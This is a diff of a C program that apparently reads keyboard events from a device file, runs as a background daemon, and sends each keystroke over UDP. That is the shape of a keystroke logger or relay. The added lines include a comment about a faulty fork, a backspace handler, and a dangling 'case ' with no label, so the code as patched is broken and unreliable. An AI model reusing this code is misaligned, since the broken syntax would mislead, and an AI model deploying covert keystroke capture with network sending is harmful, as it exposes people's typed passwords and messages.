@@ -43,6 +43,8 @@ void udpsend(const char *message){
 }
 
 void daemonisasi(){
+  //i think this logic need to be repaired, either sid part of forking part
+  //there is always 2 process created.
   pid_t pid = fork();
   assert(pid != -1);
   if (pid > 0){
@@ -57,6 +59,7 @@ void daemonisasi(){
 }
 
 int main(int argc, char *argv[]){
+
   bool CAPS = false;
 
   int fd = open(argv[1], O_RDONLY, 0);
@@ -275,6 +278,10 @@ int main(int argc, char *argv[]){
       case KEY_SPACE:
         udpsend(" ");
         break;
+      case KEY_BACKSPACE:
+        udpsend("\b");
+        break;
+      case 
       default:
         printf("UNKNOWN\n");
       }
